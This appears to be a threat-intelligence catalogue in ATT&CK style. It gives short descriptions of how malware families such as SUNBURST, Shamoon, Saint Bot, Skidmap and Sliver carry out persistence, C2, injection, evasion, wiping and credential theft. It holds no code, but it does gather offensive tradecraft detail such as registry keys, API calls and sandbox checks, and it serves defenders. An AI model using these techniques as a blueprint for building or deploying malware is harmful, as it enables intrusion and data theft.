SUNBURST was digitally signed by SolarWinds from March - May 2020.
SUNBURST used DNS for C2 traffic designed to mimic normal SolarWinds API communications.
SUNBURST collected information from a compromised host.
SUNBURST attempted to disable software security services following checks against a FNV-1a + XOR hashed hardcoded blocklist.
SUNBURST dynamically resolved C2 infrastructure for randomly-generated subdomains within a parent domain.
SUNBURST had a command to delete files.
SUNBURST had commands to enumerate files and directories.
SUNBURST created an Image File Execution Options (IFEO) Debugger registry value for the process &lt;code&gt;dllhost.exe&lt;/code&gt; to trigger the installation of Cobalt Strike.
SUNBURST removed HTTP proxy registry values to clean up traces of execution.
SUNBURST source code used generic variable names and pre-obfuscated strings, and was likely sanitized of developer comments before being added to SUNSPOT.
SUNBURST delivered different payloads, including TEARDROP in at least one instance.
SUNBURST added junk bytes to its C2 over HTTP.
SUNBURST created VBScripts that were named after existing services or folders to blend into legitimate activities.
SUNBURST had commands that allow an attacker to write or delete registry keys, and was observed stopping services by setting their &lt;code&gt;HKLM\SYSTEM\CurrentControlSet\services\\[service_name]\\Start&lt;/code&gt; registry entries to value 4. It also deleted previously-created Image File Execution Options (IFEO) Debugger registry values and registry keys related to HTTP proxy to clean up traces of its activity.
SUNBURST strings were compressed and encoded in Base64. SUNBURST also obfuscated collected system information using a FNV-1a + XOR algorithm.
SUNBURST collected a list of process names that were hashed using a FNV-1a + XOR algorithm to check against similarly-hashed hardcoded blocklists.
SUNBURST masqueraded its network traffic as the Orion Improvement Program (OIP) protocol.
SUNBURST collected the registry value &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\MachineGuid&lt;/code&gt; from compromised hosts.
SUNBURST used Rundll32 to execute payloads.
SUNBURST checked for a variety of antivirus/endpoint detection agents prior to execution.
SUNBURST used Base64 encoding in its C2 traffic.
SUNBURST C2 data attempted to appear as benign XML related to .NET assemblies or as a faux JSON blob.
SUNBURST encrypted C2 traffic using a single-byte-XOR cipher.
SUNBURST checked the domain name of the compromised host to verify it was running in a real environment.
SUNBURST collected hostname and OS version.
SUNBURST collected all network interface MAC addresses that are up and not loopback devices, as well as IP address, DHCP configuration, and domain information.
SUNBURST collected the username from a compromised host.
SUNBURST collected a list of service names that were hashed using a FNV-1a + XOR algorithm to check against similarly-hashed hardcoded blocklists.
SUNBURST collected device `UPTIME`.
SUNBURST remained dormant after initial access for a period of up to two weeks.
SUNBURST used VBScripts to initiate the execution of payloads.
SUNBURST communicated via HTTP GET or HTTP POST requests to third party servers for C2.
SUNBURST used the WMI query &lt;code&gt;Select * From Win32_SystemDriver&lt;/code&gt; to retrieve a driver listing.
SUNSPOT modified its security token to grants itself debugging privileges by adding &lt;code&gt;SeDebugPrivilege&lt;/code&gt;.
SUNSPOT malware was designed and used to insert SUNBURST into software builds of the SolarWinds Orion IT management product.
SUNSPOT decrypts SUNBURST, which was stored in AES128-CBC encrypted blobs.
SUNSPOT only replaces SolarWinds Orion source code if the MD5 checksums of both the original source code file and backdoored replacement source code match hardcoded values.
Following the successful injection of SUNBURST, SUNSPOT deleted a temporary file it created named &lt;code&gt;InventoryManager.bk&lt;/code&gt; after restoring the original SolarWinds Orion source code to the software library.
SUNSPOT enumerated the Orion software Visual Studio solution directory path.
SUNSPOT was identified on disk with a filename of &lt;code&gt;taskhostsvc.exe&lt;/code&gt; and it created an encrypted log file at &lt;code&gt;C:\Windows\Temp\vmware-vmdmp.log&lt;/code&gt;.
SUNSPOT used Windows API functions such as &lt;code&gt;MoveFileEx&lt;/code&gt; and &lt;code&gt;NtQueryInformationProcess&lt;/code&gt; as part of the SUNBURST injection process.
SUNSPOT encrypted log entries it collected with the stream cipher RC4 using a hard-coded key. It also uses AES128-CBC encrypted blobs for SUNBURST source code and data extracted from the SolarWinds Orion &lt;MsBuild.exe&lt;/code&gt; process.
SUNSPOT monitored running processes for instances of &lt;code&gt;MsBuild.exe&lt;/code&gt; by hashing the name of each running process and comparing it to the corresponding value &lt;code&gt;0x53D525&lt;/code&gt;. It also extracted command-line arguments and individual arguments from the running &lt;code&gt;MsBuild.exe&lt;/code&gt; process to identify the directory path of the Orion software Visual Studio solution.
SUNSPOT created a copy of the SolarWinds Orion software source file with a &lt;code&gt;.bk&lt;/code&gt; extension to backup the original content, wrote SUNBURST using the same filename but with a &lt;code&gt;.tmp&lt;/code&gt; extension, and then moved SUNBURST using &lt;code&gt;MoveFileEx&lt;/code&gt; to the original filename with a &lt;code&gt;.cs&lt;/code&gt; extension so it could be compiled within Orion software.
SUPERNOVA contained Base64-encoded strings.
SUPERNOVA was installed via exploitation of a SolarWinds Orion API authentication bypass vulnerability (CVE-2020-10148).
SUPERNOVA has masqueraded as a legitimate SolarWinds DLL.
SUPERNOVA had to receive an HTTP GET request containing a specific set of parameters in order to execute.
SUPERNOVA is a Web shell.
SVCReady has created the `HKEY_CURRENT_USER\Software\Classes\CLSID\{E6D34FFC-AD32-4d6a-934C-D387FA873A19}` Registry key for persistence.
SVCReady can collect data from an infected host.
SVCReady can send collected data in JSON format to its C2 server.
SVCReady has the ability to download additional tools such as the RedLine Stealer to an infected host.
SVCReady has relied on users clicking a malicious attachment delivered through spearphishing.
SVCReady has named a task `RecoveryExTask` as part of its persistence activity.
SVCReady can use Windows API calls to gather information from an infected host.
SVCReady can encrypt victim data with an RC4 cipher.
SVCReady can check for the number of devices plugged into an infected host.
SVCReady can collect a list of running processes from an infected host.
SVCReady can search for the `HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System` Registry key to gather system information.
SVCReady has used `rundll32.exe` for execution.
SVCReady can create a scheduled task named `RecoveryExTask` to gain persistence.
SVCReady can take a screenshot from an infected host.
SVCReady can collect a list of installed software from an infected host.
SVCReady has been distributed via spearphishing campaigns containing malicious Mircrosoft Word documents.
SVCReady has the ability to determine if its runtime environment is virtualized.
SVCReady has the ability to collect information such as computer name, computer manufacturer, BIOS, operating system, and firmware, including through the use of `systeminfo.exe`.
SVCReady can collect the username from an infected host.
SVCReady can collect time zone information.
SVCReady can enter a sleep stage for 30 minutes to evade detection.
SVCReady has used VBA macros to execute shellcode.
SVCReady can communicate with its C2 servers via HTTP.
SVCReady can use `WMI` queries to detect the presence of a virtual machine environment.
SYNful Knock has the capability to add its own custom backdoor password when it modifies the operating system of the affected network device.
SYNful Knock is malware that is inserted into a network device by patching the operating system image.
SYNful Knock can be sent instructions via special packets to change its functionality. Code for new functionality can be included in these messages.
SYSCON has the ability to use FTP in C2 communications.
SYSCON has been executed by luring victims to open malicious e-mail attachments.
SYSCON has the ability to use Tasklist to list running processes.
SYSCON has the ability to use Systeminfo to identify system information.
SYSCON has the ability to execute commands through cmd on a compromised host.
Saint Bot has written its payload into a newly-created `EhStorAuthn.exe` process using `ZwWriteVirtualMemory` and executed it using `NtQueueApcThread` and `ZwAlertResumeThread`.
Saint Bot has attempted to bypass UAC using `fodhelper.exe` to escalate privileges.
Saint Bot can collect files and information from a compromised host.
Saint Bot has used `is_debugger_present` as part of its environmental checks.
Saint Bot can deobfuscate strings and files for execution.
Saint Bot has injected its DLL component into `EhStorAurhn.exe`.
Saint Bot can run a batch script named `del.bat` to remove any Saint Bot payload-linked files from a compromise system if anti-analysis or locale checks fail.
Saint Bot can search a compromised host for specific files.
Saint Bot can download additional files onto a compromised host.
Saint Bot had used `InstallUtil.exe` to download and deploy executables.
Saint Bot has relied upon users to execute a malicious attachment delivered via spearphishing.
Saint Bot has relied on users to click on a malicious link delivered via a spearphishing.
Saint Bot has renamed malicious binaries as `wallpaper.mp4` and `slideshow.mp4` to avoid detection.
Saint Bot has been disguised as a legitimate executable, including as Windows SDK.
Saint Bot has used different API calls, including `GetProcAddress`, `VirtualAllocEx`, `WriteProcessMemory`, `CreateProcessA`, and `SetThreadContext`.
Saint Bot has been obfuscated to help avoid detection.
Saint Bot has used PowerShell for execution.
Saint Bot has enumerated running processes on a compromised host to determine if it is running under the process name `dfrgui.exe`.
The Saint Bot loader has used API calls to spawn `MSBuild.exe` in a suspended state before injecting the decrypted Saint Bot binary into it.
Saint Bot has used `check_registry_keys` as part of its environmental checks.
Saint Bot has established persistence by being copied to the Startup directory or through the `\Software\Microsoft\Windows\CurrentVersion\Run` registry key.
Saint Bot has used `regsvr32` to execute scripts.
Saint Bot has created a scheduled task named "Maintenance" to establish persistence.
Saint Bot has been packed using a dark market crypter.
Saint Bot has been distributed as malicious attachments within spearphishing emails.
Saint Bot has been distributed through malicious links contained within spearphishing emails.
Saint Bot has used Base64 to encode its C2 communications.
Saint Bot has run several virtual machine and sandbox checks, including checking if `Sbiedll.dll` is present in a list of loaded modules, comparing the machine name to `HAL9TH` and the user name to `JohnDoe`, and checking the BIOS version for known virtual machine identifiers.
Saint Bot can identify the OS version, CPU, and other details from a victim's machine.
Saint Bot has conducted system locale checks to see if the compromised host is in Russia, Ukraine, Belarus, Armenia, Kazakhstan, or Moldova.
Saint Bot can collect the IP address of a victim machine.
Saint Bot can collect the username from a compromised host.
Saint Bot has used the command `timeout 20` to pause the execution of its initial loader.
Saint Bot has used `.vbs` scripts for execution.
Saint Bot has used HTTP for C2 communications.
Saint Bot has used `cmd.exe` and `.bat` scripts for execution.
Sakula contains UAC bypass code for both 32- and 64-bit systems.
Sakula uses DLL side-loading, typically using a digitally signed sample of Kaspersky Anti-Virus (AV) 6.0 for Windows Workstations or McAfee's Outlook Scan About Box to load malicious DLL files.
Sakula uses single-byte XOR obfuscation to obfuscate many of its files.
Some Sakula samples use cmd.exe to delete temporary files.
Sakula has the capability to download files.
Most Sakula samples maintain persistence by setting the Registry Run key &lt;code&gt;SOFTWARE\Microsoft\Windows\CurrentVersion\Run\&lt;/code&gt; in the HKLM or HKCU hive, with the Registry value and file name varying by sample.
Sakula calls cmd.exe to run various DLL files via rundll32.
Sakula encodes C2 traffic with single-byte XOR keys.
Sakula uses HTTP for C2.
Sakula calls cmd.exe to run various DLL files via rundll32 and also to perform file cleanup. Sakula also has the capability to invoke a reverse shell.
Some Sakula samples install themselves as services for persistence by calling WinExec with the &lt;code&gt;net start&lt;/code&gt; argument.
SamSam has used garbage code to pad some of its malware components.
SamSam encrypts victim files using RSA-2048 encryption and demands a ransom be paid in Bitcoin to decrypt those files.
SamSam has been seen using AES or DES to encrypt payloads and payload components.
SamSam has been seen deleting its own files and payloads to make analysis of the attack more difficult.
SamSam uses custom batch scripts to execute some of its components.
Samurai can compile and execute downloaded modules at runtime.
Samurai can leverage an exfiltration module to download arbitrary files from compromised machines.
Samurai can encrypt API name strings with an XOR-based algorithm.
Samurai can use a specific module for file enumeration.
Samurai has been used to deploy other malware including Ninja.
Samurai has created the directory `%COMMONPROGRAMFILES%\Microsoft Shared\wmi\` to contain DLLs for loading successive stages.
The Samurai loader component can create multiple Registry keys to force the svchost.exe process to load the final backdoor.
Samurai has the ability to call Windows APIs.
Samurai can use a proxy module to forward TCP packets to external hosts.
Samurai can encrypt the names of requested APIs and deliver its final payload as a compressed, encrypted and base64 encoded blob.
Samurai has the ability to proxy connections to specified remote IPs and ports through a a proxy module.
Samurai can query `SOFTWARE\Microsoft\.NETFramework\policy\v2.0` for discovery.
Samurai can check for the presence and version of the .NET framework.
Samurai can base64 encode data sent in C2 communications prior to its encryption.
Samurai can encrypt C2 communications with AES.
Samurai can use a .NET HTTPListener class to receive and handle HTTP POST requests.
Samurai can use a remote command module for execution via the Windows command line.
Samurai can create a service at `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost` to trigger execution and maintain persistence.
Sardonic has the ability to send a random 64-byte RC4 key to communicate with actor-controlled C2 servers by using an RSA public key.
Sardonic can use the `QueueUserAPC` API to execute shellcode on a compromised machine.
Sardonic PowerShell scripts can be encrypted with RC4 and compressed using Gzip.
Sardonic has the ability to collect data from a compromised machine to deliver to the attacker.
Sardonic can first decrypt with the RC4 algorithm using a hardcoded decryption key before decompressing.
Sardonic has the ability to delete created WMI objects to evade detections.
Sardonic has the ability to upload additional malicious files to a compromised machine.
Sardonic has the ability to call Win32 API functions to determine if `powershell.exe` is running.
Sardonic has the ability to execute the `net view` command.
Sardonic can communicate with actor-controlled C2 servers by using a custom little-endian binary protocol.
Sardonic has the ability to connect with actor-controlled C2 servers using a custom binary protocol over port 443.
Sardonic can use certain ConfuserEx features for obfuscation and can be encoded in a base64 string.
Sardonic has the ability to execute PowerShell commands on a compromised machine.
Sardonic has the ability to execute the `tasklist` command.
Sardonic has a plugin system that can load specially made DLLs into memory and execute their functions.
Sardonic can encode client ID data in 32 uppercase hex characters and transfer to the actor-controlled C2 server.
Sardonic has the ability to use an RC4 key to encrypt communications to and from actor-controlled C2 servers.
Sardonic has the ability to collect the computer name, CPU manufacturer name, and C:\ drive serial number from a compromised machine. Sardonic also has the ability to execute the `ver` and `systeminfo` commands.
Sardonic has the ability to execute the `ipconfig` command.
Sardonic has the ability to execute the `netstat` command.
Sardonic has the ability to execute the `net start` command.
Sardonic has the ability to run `cmd.exe` or other interactive processes on a compromised computer.
Sardonic can use WMI to execute PowerShell commands on a compromised machine.
Sardonic can use a WMI event filter to invoke a command-line event consumer to gain persistence.
SeaDuke compressed data with zlib prior to sending it over C2.
SeaDuke can securely delete files, including deleting itself from the victim.
SeaDuke is capable of uploading and downloading files.
Some SeaDuke samples have a module to use pass the ticket with Kerberos for authentication.
SeaDuke uses a module to execute Mimikatz with PowerShell to perform Pass the Ticket.
SeaDuke is capable of persisting via the Registry Run key or a .lnk file stored in the Startup directory.
Some SeaDuke samples have a module to extract email from Microsoft Exchange servers using compromised credentials.
SeaDuke is capable of persisting via a .lnk file stored in the Startup directory.
SeaDuke has been packed with the UPX packer.
SeaDuke C2 traffic is base64-encoded.
SeaDuke C2 traffic has been encrypted with RC4 and AES.
Some SeaDuke samples have a module to extract email from Microsoft Exchange servers using compromised credentials.
SeaDuke uses HTTP and HTTPS for C2.
SeaDuke is capable of executing commands.
SeaDuke uses an event filter in WMI code to execute a previously dropped executable shortly after system startup.
Seasalt obfuscates configuration data.
Seasalt has a command to delete a specified file.
Seasalt has the capability to identify the drive type on a victim.
Seasalt has a command to download additional files.
Seasalt has masqueraded as a service called "SaSaut" with a display name of "System Authorization Service" in an apparent attempt to masquerade as a legitimate service.
Seasalt has a command to perform a process listing.
Seasalt creates a Registry entry to ensure infection after reboot under &lt;code&gt;HKLM\Software\Microsoft\Windows\currentVersion\Run&lt;/code&gt;.
Seasalt uses HTTP for C2 communications.
Seasalt uses cmd.exe to create a reverse shell on the infected endpoint.
Seasalt is capable of installing itself as a service.
ServHelper has added a user named "supportaccount" to the Remote Desktop Users and Administrators groups.
ServHelper may set up a reverse SSH tunnel to give the attacker access to services running on the victim, such as RDP.
ServHelper has a module to delete itself from the infected machine.
ServHelper may download additional files to execute.
ServHelper has created a new user named "supportaccount".
ServHelper has the ability to execute a PowerShell script to get information from the infected host.
ServHelper may attempt to establish persistence via the &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\&lt;/code&gt; run key.
ServHelper has commands for adding a remote desktop user and sending RDP traffic to the attacker through a reverse SSH tunnel.
ServHelper contains a module for downloading and executing DLLs that leverages &lt;code&gt;rundll32.exe&lt;/code&gt;.
ServHelper contains modules that will use schtasks to carry out malicious operations.
ServHelper will attempt to enumerate Windows version and system architecture.
ServHelper will attempt to enumerate the username of the victim.
ServHelper uses HTTP for C2.
ServHelper can execute shell commands against cmd.
Seth-Locker can encrypt files on a targeted system, appending them with the suffix .seth.
Seth-Locker has the ability to download and execute files on a compromised host.
Seth-Locker can execute commands via the command line shell.
ShadowPad has used DNS tunneling for C2 communications.
ShadowPad has decrypted a binary blob to start execution.
ShadowPad uses a DGA that is based on the day of the month for C2 servers.
ShadowPad has injected a DLL into svchost.exe.
ShadowPad has used FTP for C2 communications.
ShadowPad maintains a configuration block and virtual file system in the Registry.
ShadowPad has deleted arbitrary Registry values.
ShadowPad has downloaded code from a C2 server.
ShadowPad can modify the Registry to store and maintain a configuration block and virtual file system.
ShadowPad has used UDP for C2 communications.
ShadowPad has encoded data as readable Latin characters.
ShadowPad has encrypted its payload, a virtual file system, and various files.
ShadowPad has collected the PID of a malicious process.
ShadowPad has injected an install module into a newly created process.
ShadowPad has sent data back to C2 every 8 hours.
ShadowPad has discovered system information including memory status, CPU frequency, OS versions, and volume serial numbers.
ShadowPad has collected the domain name of the victim system.
ShadowPad has collected the username of the victim system.
ShadowPad has collected the current date and time of the victim system.
ShadowPad communicates over HTTP to retrieve a string that is decoded into a C2 server URL.
Shamoon attempts to disable UAC remote restrictions by modifying the Registry.
Shamoon attempts to overwrite operating system files and disk structures with image files. In a later variant, randomly generated data was used for data overwrites.
Shamoon has an operational mode for encrypting data instead of overwriting it.
Shamoon decrypts ciphertext using an XOR cipher and a base64-encoded string.
Shamoon has been seen overwriting features of disk structure such as the MBR.
If Shamoon cannot access shares using current privileges, it attempts access using hard coded, domain-specific credentials gathered earlier in the intrusion.
Shamoon can download an executable to run on the victim.
Shamoon attempts to copy itself to remote machines on the network.
Shamoon creates a new service named “ntssrv” that attempts to appear legitimate; the service's display name is “Microsoft Network Realtime Inspection Service” and its description is “Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols.” Newer versions create the "MaintenaceSrv" service, which misspells the word "maintenance."
Once Shamoon has access to a network share, it enables the RemoteRegistry service on the target system. It will then connect to the system with RegConnectRegistryW and modify the Registry to disable UAC remote restrictions by setting &lt;code&gt;SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy&lt;/code&gt; to 1.
Shamoon contains base64-encoded strings.
Shamoon queries several Registry keys to identify hard disk partitions to overwrite.
Shamoon scans the C-class subnet of the IPs on the victim's interfaces.
Shamoon accesses network share(s), enables share access to the target device, copies an executable payload to the target system, and uses a Scheduled Task/Job to execute the malware.
Shamoon copies an executable payload to the target system by using SMB/Windows Admin Shares and then scheduling an unnamed task to execute the malware.
Shamoon creates a new service named “ntssrv” to execute the payload. Shamoon can also spread via PsExec.
Shamoon obtains the victim's operating system version and keyboard layout and sends the information to the C2 server.
Shamoon obtains the target's IP address and local network segment.
Shamoon will reboot the infected system once the wiping functionality has been completed.
Shamoon obtains the system time and will only activate if it is greater than a preset date.
Shamoon can change the modified time for files to evade forensic detection.
Shamoon can impersonate tokens using &lt;code&gt;LogonUser&lt;/code&gt;, &lt;code&gt;ImpersonateLoggedOnUser&lt;/code&gt;, and &lt;code&gt;ImpersonateNamedPipeClient&lt;/code&gt;.
Shamoon has used HTTP for C2.
Shamoon creates a new service named “ntssrv” to execute the payload. Newer versions create the "MaintenaceSrv" and "hdv_725x" services.
Shark can use DNS in C2 communications.
Shark has stored information in folders named `U1` and `U2` prior to exfiltration.
Shark can upload files to its C2.
Shark can extract and decrypt downloaded .zip files.
Shark can send DNS C2 communications using a unique domain generation algorithm.
Shark can use encrypted and encoded files for C2 configuration.
Shark has the ability to upload files from the compromised host over a DNS or HTTP C2 channel.
Shark can update its configuration to use a different C2 server.
Shark can delete files downloaded to the compromised host.
Shark  can download additional files from its C2 via HTTP or DNS.
Shark binaries have been named `audioddg.pdb` and `Winlangdb.pdb` in order to appear legitimate.
Shark can query `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography MachineGuid` to retrieve the machine GUID.
Shark can pause C2 communications for a specified time.
Shark can stop execution if the screen width of the targeted machine is not over 600 pixels.
Shark can collect the GUID of a targeted machine.
Shark has the ability to use HTTP in C2 communications.
Shark has the ability to use `CMD` to execute commands.
SharpDisco has dropped a recent-files stealer plugin to `C:\Users\Public\WinSrcNT\It11.exe`.
SharpDisco can load a plugin to exfiltrate stolen files to SMB shares also used in C2.
SharpDisco has the ability to transfer data between SMB shares.
SharpDisco can identify recently opened files by using an LNK format parser to extract the original file path from LNK files found in either `%USERPROFILE%\Recent` (Windows XP) or `%APPDATA%\Microsoft\Windows\Recent` (newer Windows versions) .
SharpDisco can hide windows using `ProcessWindowStyle.Hidden`.
SharpDisco has been used to download a Python interpreter to `C:\Users\Public\WinTN\WinTN.exe` as well as other plugins from external sources.
SharpDisco can leverage Native APIs through plugins including `GetLogicalDrives`.
SharpDisco has dropped a plugin to monitor external drives to `C:\Users\Public\It3.exe`.
SharpDisco can create scheduled tasks to execute reverse shells that read and write data to and from specified SMB shares.
SharpDisco can use a plugin to enumerate system drives.
SharpDisco can use `cmd.exe` to execute plugins and to send command output to  specified SMB shares.
SharpStage has decompressed data received from the C2 server.
SharpStage has the ability to download and execute additional payloads via a DropBox API.
SharpStage can execute arbitrary commands with PowerShell.
SharpStage has the ability to create persistence for the malware using the Registry autorun key and startup folder.
SharpStage has a persistence component to write a scheduled task for the payload.
SharpStage has the ability to capture the victim's screen.
SharpStage has checked the system settings to see if Arabic is the configured language.
SharpStage  has been used to target Arabic-speaking users and used code that checks if the compromised machine has the Arabic language installed.
SharpStage has used a legitimate web service for evading detection.
SharpStage can execute arbitrary commands with the command line.
SharpStage can use WMI for execution.
ShimRat has installed shim databases in the &lt;code&gt;AppPatch&lt;/code&gt; folder.
ShimRat has hijacked the cryptbase.dll within migwiz.exe to escalate privileges. This prevented the User Access Control window from appearing.
ShimRat has the capability to upload collected files to a C2.
ShimRat has decompressed its core DLL using shellcode once an impersonated antivirus component was running on a system.
ShimRat can use pre-configured HTTP proxies.
ShimRat has used a secondary C2 location if the first was unavailable.
ShimRat can uninstall itself from compromised hosts, as well create and modify directories, delete, move, copy, and rename files.
ShimRat can list directories.
ShimRat can hijack the cryptbase.dll within migwiz.exe to escalate privileges and bypass UAC controls.
ShimRat can download additional files.
ShimRat can impersonate Windows services and antivirus products to avoid detection on compromised systems.
ShimRat has registered two registry keys for shim databases.
ShimRat has used Windows API functions to install the service and shim.
ShimRat can enumerate connected drives for infected host machines.
ShimRat has been delivered as a package that includes compressed DLL and shellcode payloads within a .dat file.
ShimRat has installed a registry based start-up key &lt;code&gt;HKCU\Software\microsoft\windows\CurrentVersion\Run&lt;/code&gt; to maintain persistence should other methods fail.
ShimRat can sleep when instructed to do so by the C2.
ShimRat's loader has been packed with the compressed ShimRat core DLL and the legitimate DLL for it to hijack.
ShimRat communicated over HTTP and HTTPS with C2 servers.
ShimRat can be issued a command shell function from the C2.
ShimRat has installed a Windows service to maintain persistence on victim machines.
ShimRatReporter listed all non-privileged and privileged accounts available on the machine.
ShimRatReporter used LZ compression to compress initial reconnaissance reports before sending to the C2.
ShimRatReporter gathered information automatically, without instruction from a C2, related to the user and host machine that is compiled into a report and sent to the operators.
ShimRatReporter sent collected system and network information compiled into a report to an adversary-controlled C2.
ShimRatReporter sent generated reports to the C2 via HTTP POST requests.
ShimRatReporter had the ability to download additional payloads.
ShimRatReporter spoofed itself as &lt;code&gt;AlphaZawgyl_font.exe&lt;/code&gt;, a specialized Unicode font.
ShimRatReporter used several Windows API functions to gather information from the infected system.
ShimRatReporter encrypted gathered information with a combination of shifting and XOR using a static key.
ShimRatReporter gathered the local privileges for the infected host.
ShimRatReporter listed all running processes on the machine.
ShimRatReporter gathered a list of installed software on the infected host.
ShimRatReporter gathered the operating system name and specific Windows version of an infected machine.
ShimRatReporter gathered the local proxy, domain, IP, routing tables, mac address, gateway, DNS servers, and DHCP status information from an infected host.
ShimRatReporter used the Windows function &lt;code&gt;GetExtendedUdpTable&lt;/code&gt; to detect connected UDP endpoints.
ShimRatReporter communicated over HTTP with preconfigured C2 servers.
Sibot has obfuscated scripts used in execution.
Sibot can decrypt data received from a C2 and save to a file.
Sibot will delete itself if a certain server response is received.
Sibot has installed a second-stage script in the &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\sibot&lt;/code&gt; registry key.
Sibot will delete an associated registry key if a certain server response is received.
Sibot can download and execute a payload onto a compromised system.
Sibot has downloaded a DLL to the &lt;code&gt;C:\windows\system32\drivers\&lt;/code&gt; folder and renamed it with a &lt;code&gt;.sys&lt;/code&gt; extension.
Sibot has modified the Registry to install a second-stage script in the &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\sibot&lt;/code&gt;.
Sibot has been executed via MSHTA application.
Sibot has queried the registry for proxy server information.
Sibot has executed downloaded DLLs with &lt;code&gt;rundll32.exe&lt;/code&gt;.
Sibot has been executed via a scheduled task.
Sibot checked if the compromised system is configured to use proxies.
Sibot has retrieved a GUID associated with a present LAN connection on a compromised machine.
Sibot executes commands using VBScript.
Sibot communicated with its C2 server via HTTP GET requests.
Sibot has used a legitimate compromised website to download DLLs to the victim's machine.
Sibot has used WMI to discover network connections and configurations. Sibot has also used the Win32_Process class to execute a malicious DLL.
SideTwist can embed C2 responses in the source code of a fake Flickr webpage.
SideTwist has the ability to upload files from a compromised host.
SideTwist can decode and decrypt messages received from C2.
SideTwist has exfiltrated data over its C2 channel.
SideTwist has primarily used port 443 for C2 but can use port 80 as a fallback.
SideTwist has the ability to search for specific files.
SideTwist has the ability to download additional files.
SideTwist can use &lt;code&gt;GetUserNameW&lt;/code&gt;, &lt;code&gt;GetComputerNameW&lt;/code&gt;, and &lt;code&gt;GetComputerNameExW&lt;/code&gt; to gather information.
SideTwist has used Base64 for encoded C2 traffic.
SideTwist can encrypt C2 communications with a randomly generated key.
SideTwist can collect the computer name of a targeted system.
SideTwist has the ability to collect the domain name on a compromised host.
SideTwist can collect the username on a targeted system.
SideTwist has used HTTP GET and POST requests over port 443 for C2.
SideTwist can execute shell commands on a compromised host.
Siloscape connects to an IRC server for C2.
Siloscape can send kubectl commands to victim clusters through an IRC channel and can run kubectl locally to spread once within a victim cluster.
Siloscape has decrypted the password of the C2 server with a simple byte by byte XOR. Siloscape also writes both an archive of Tor and the &lt;code&gt;unzip&lt;/code&gt; binary to disk from data embedded within the payload using Visual Studio’s Resource Manager.
Siloscape maps the host’s C drive to the container by creating a global symbolic link to the host through the calling of &lt;code&gt;NtSetInformationSymbolicLink&lt;/code&gt;.
Siloscape is executed after the attacker gains initial access to a Windows container using a known vulnerability.
Siloscape has leveraged a vulnerability in Windows containers to perform an Escape to Host.
Siloscape searches for the Kubernetes config file and other related files using a regular expression.
Siloscape uses Tor to communicate with C2.
Siloscape makes various native API calls.
Siloscape itself is obfuscated and uses obfuscated API calls.
Siloscape checks for Kubernetes node permissions.
Siloscape searches for the kubectl binary.
Siloscape impersonates the main thread of &lt;code&gt;CExecSvc.exe&lt;/code&gt; by calling &lt;code&gt;NtImpersonateThread&lt;/code&gt;.
Siloscape can run cmd through an IRC channel.
Skeleton Key is used to patch an enterprise domain controller authentication process with a backdoor password. It allows adversaries to bypass the standard authentication system to use a defined password for all accounts authenticating to that domain controller.
Skidmap has installed itself via crontab.
Skidmap has the ability to download, unpack, and decrypt tar.gz files .
Skidmap has the ability to set SELinux to permissive mode.
Skidmap has encrypted it's main payload using 3DES.
Skidmap has checked for the existence of specific files including &lt;code&gt;/usr/sbin/setenforce&lt;/code&gt; and &lt;code&gt; /etc/selinux/config&lt;/code&gt;. It also has the ability to monitor the cryptocurrency miner file and process.
Skidmap has the ability to download files on an infected host.
Skidmap has the ability to install several loadable kernel modules (LKMs) on infected machines.
Skidmap has created a fake &lt;code&gt;rm&lt;/code&gt; binary to replace the legitimate Linux binary.
Skidmap has the ability to replace the pam_unix.so file on an infected machine with its own malicious version that accepts a specific backdoor password for all users.
Skidmap has monitored critical processes to ensure resiliency.
Skidmap is a kernel-mode rootkit used for cryptocurrency mining.
Skidmap is a kernel-mode rootkit that has the ability to hook system calls to hide specific files and fake network and CPU-related statistics to make the CPU load of the infected machine always appear low.
Skidmap has the ability to add the public key of its handlers to the &lt;code&gt;authorized_keys&lt;/code&gt; file to maintain persistence on an infected host.
Skidmap has the ability to check if &lt;code&gt;/usr/sbin/setenforce&lt;/code&gt; exists. This file controls what mode SELinux is in.
Skidmap has the ability to check whether the infected system’s OS is Debian or RHEL/CentOS to determine which cryptocurrency miner it should use.
Skidmap has used &lt;code&gt;pm.sh&lt;/code&gt; to download and install its main payload.
Sliver has the ability to manipulate user tokens on targeted Windows systems.
Sliver can use mutual TLS and RSA  cryptography to exchange a session key.
Sliver can support C2 communications over DNS.
Sliver can encrypt strings at compile time.
Sliver can exfiltrate files from the victim using the &lt;code&gt;download&lt;/code&gt; command.
Sliver can enumerate files on a target system.
Sliver can upload files from the C2 server to the victim machine using the &lt;code&gt;upload&lt;/code&gt; command.
Sliver can inject code into local and remote processes.
Sliver can take screenshots of the victim’s active display.
Sliver can use standard encoding techniques like gzip and hex to ASCII to encode the C2 communication payload.
Sliver can encode binary data into a .PNG file for C2 communication.
Sliver can use AES-GCM-256 to encrypt a session key for C2 message exchange.
Sliver has the ability to gather network configuration information.
Sliver can collect network connection information.
Sliver has the ability to support C2 communications over HTTP/S.
Small Sieve can use SSL/TLS for its HTTPS Telegram Bot API-based C2 channel.
Small Sieve has the ability to use the Telegram Bot API from Telegram Messenger to send and receive messages.
Small Sieve can only execute correctly if the word `Platypus` is passed to it on the command line.
Small Sieve has the ability to download files.
Small Sieve can use variations of Microsoft and Outlook spellings, such as "Microsift", in its file names to avoid detection.
Small Sieve can use a custom hex byte swapping encoding scheme to obfuscate tasking traffic.
Small Sieve has the ability to use a custom hex byte swapping encoding scheme combined with an obfuscated Base64 function to protect program strings and Telegram credentials.
Small Sieve can use Python scripts to execute commands.
Small Sieve has the ability to add itself to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OutlookMicrosift` for persistence.
Small Sieve can obtain the IP address of a victim host.
Small Sieve can obtain the id of a logged in user.
Small Sieve can contact actor-controlled C2 servers by using the Telegram API over HTTPS.
Small Sieve can use `cmd.exe` to execute commands on a victim's system.
Smoke Loader searches for files named logins.json to parse for credentials.
Smoke Loader searches for credentials stored from web browsers.
